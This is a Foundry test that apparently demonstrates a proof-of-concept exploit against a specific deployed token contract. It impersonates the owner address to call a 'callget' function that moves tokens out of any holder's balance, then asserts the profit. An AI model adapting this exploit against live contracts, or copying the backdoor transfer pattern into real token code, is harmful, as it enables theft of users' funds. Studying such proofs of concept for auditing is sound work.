pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface Imybricks {
    function callget(address _from, address _to, uint256 _amount) external;
    function mint(address recipient_, uint256 amount_) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF347bDc0e502D33978b3c4d187bf75E5B452E491;
    address attacker = address(this);
    Imybricks token;
    address owner;
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = Imybricks(TARGET);
        owner = 0xCaf3f6e1627464A7967954902150345b95543c3d;
        victim = TARGET;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xF347bDc0e502D33978b3c4d187bf75E5B452E491).balanceOf(address(this));
        uint256 amount = 1000 ether;

                // Setup: Mint tokens to attacker, then transfer to victim to create a holder.
                vm.startPrank(owner);
                token.mint(attacker, amount);
                vm.stopPrank();

                // Attacker now has tokens and sends them to the victim
                token.transfer(victim, amount);
                assertEq(token.balanceOf(victim), amount);
                assertEq(token.balanceOf(attacker), 0);

                // Exploit: As owner, call callget to steal tokens from the victim.
                vm.startPrank(owner);
                token.callget(victim, attacker, amount);
                vm.stopPrank();

                // Attacker's balance should now be the stolen amount.
                assertGt(token.balanceOf(attacker), 0);
        uint256 finalBalance = IERC20(0xF347bDc0e502D33978b3c4d187bf75E5B452E491).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

